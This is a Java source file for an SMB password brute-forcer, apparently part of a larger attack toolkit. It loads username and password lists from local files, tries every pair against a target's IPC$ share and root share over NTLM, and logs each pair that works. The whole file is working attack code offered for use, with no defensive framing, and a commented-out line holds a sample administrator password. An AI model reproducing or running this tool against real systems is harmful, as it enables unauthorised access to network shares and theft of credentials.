package action.bruter;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Properties;

import javax.mail.Session;
import javax.mail.Transport;

import jcifs.smb.NtlmPasswordAuthentication;
import jcifs.smb.SmbFile;
import tools.Logger;

public class SmbBruter {
	private static ArrayList<String> userlist = new ArrayList<String>();
	private static ArrayList<String> passlist = new ArrayList<String>();
	private static Properties props = null;
	
	public void run(String target) {
		if (!getUserPass()) {
			Logger.getInstance().insertLog("Error", "SmtpBruter getUserPass error!");
			return;
		}
		
		for (int i=0; i<userlist.size(); i++)
			for (int j=0; j<passlist.size(); j++) 
				checkLogin(target, userlist.get(i), passlist.get(j));
	}
	
	private void checkLogin(String target, String username, String password) {
		SmbFile file = null;
		try {
			//String urls = "smb://administrator:zz020219@192.168.1.101/";\
			NtlmPasswordAuthentication auth = new NtlmPasswordAuthentication(target, username, password);  //先登录验证
			file = new SmbFile("smb://"+target+"/ipc$/", auth); 
			SmbFile[] smbFiles = file.listFiles();
			
			Logger.getInstance().insertResult(target+":"+username+":"+password);
		} catch (Exception e) {
			// TODO Auto-generated catch block
		}
		
		try {
			//String urls = "smb://administrator:zz020219@192.168.1.101/";\
			NtlmPasswordAuthentication auth = new NtlmPasswordAuthentication(target, username, password);  //先登录验证
			file = new SmbFile("smb://"+target+"/", auth); 
			SmbFile[] smbFiles = file.listFiles();
			
			Logger.getInstance().insertResult(target+":"+username+":"+password);
		} catch (Exception e) {
			// TODO Auto-generated catch block
		}
	}
	
	private boolean getUserPass() {
		if (userlist.size() == 0) {
			File directory = new File("");
			String courseFile = "";
			try {
				courseFile = directory.getCanonicalPath();
			} catch (IOException e) {
				return false;
			}
			
			String fileName = courseFile+"\\options\\smb_user.txt";
			FileInputStream fis = null;
			InputStreamReader isr = null;
			BufferedReader br = null;
			try {
				String str = "";
				fis = new FileInputStream(fileName);
			    isr = new InputStreamReader(fis);
			    br = new BufferedReader(isr);
			    while ((str = br.readLine()) != null) {
			    	userlist.add(str);
			    }
			} catch (FileNotFoundException e) {
				return false;
			} catch (IOException e) {
				return false;
			} finally {
				try {
					br.close();
					isr.close();
					fis.close();
				} catch (IOException e) {
					return false;
				}
			}	
		}
		
		if (passlist.size() == 0) {
			File directory = new File("");
			String courseFile = "";
			try {
				courseFile = directory.getCanonicalPath();
			} catch (IOException e) {
				return false;
			}
			
			String fileName = courseFile+"\\options\\smb_pass.txt";
			FileInputStream fis = null;
			InputStreamReader isr = null;
			BufferedReader br = null;
			try {
				String str = "";
				fis = new FileInputStream(fileName);
			    isr = new InputStreamReader(fis);
			    br = new BufferedReader(isr);
			    while ((str = br.readLine()) != null) {
			    	passlist.add(str);
			    }
			} catch (FileNotFoundException e) {
				return false;
			} catch (IOException e) {
				return false;
			} finally {
				try {
					br.close();
					isr.close();
					fis.close();
				} catch (IOException e) {
					return false;
				}
			}
		}
		
		return true;
	}
}
